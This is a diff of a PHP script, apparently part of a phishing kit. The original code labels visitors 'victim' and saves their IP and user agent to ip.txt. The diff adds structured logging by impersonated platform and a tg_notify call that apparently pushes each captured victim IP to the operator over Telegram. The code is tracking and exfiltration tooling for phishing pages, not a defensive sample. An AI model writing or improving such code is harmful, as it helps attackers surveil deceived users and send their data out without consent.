@@ -1,29 +1,30 @@
 <?php
+require_once __DIR__ . '/../logger.php';
 
-if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    {
-      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-    }
-elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    {
-      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-    }
-else
-    {
-      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-    }
-$useragent = " User-Agent: ";
-$browser = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'] ?? '';
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+// Capture any forwarded IP headers
+if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
 
-
-$file = 'ip.txt';
-$victim = "IP: ";
+$platform = basename(__DIR__);
+$data = [
+    'platform'   => $platform,
+    'ip'         => $ip,
+    'user_agent' => $ua,
+];
+log_event('ip', $data);
+$msg = "[{$platform}] IP captured: {$ip}";
+tg_notify($msg);
+// Retain original behavior: still output a simple text file for backward compatibility (optional)
+$file = __DIR__ . '/ip.txt';
 $fp = fopen($file, 'a');
-
-fwrite($fp, $victim);
-fwrite($fp, $ipaddress);
-fwrite($fp, $useragent);
-fwrite($fp, $browser);
-
-
-fclose($fp);
+if ($fp) {
+    fwrite($fp, "IP: $ip\r\n");
+    fwrite($fp, "User-Agent: $ua\r\n");
+    fclose($fp);
+}
+?>
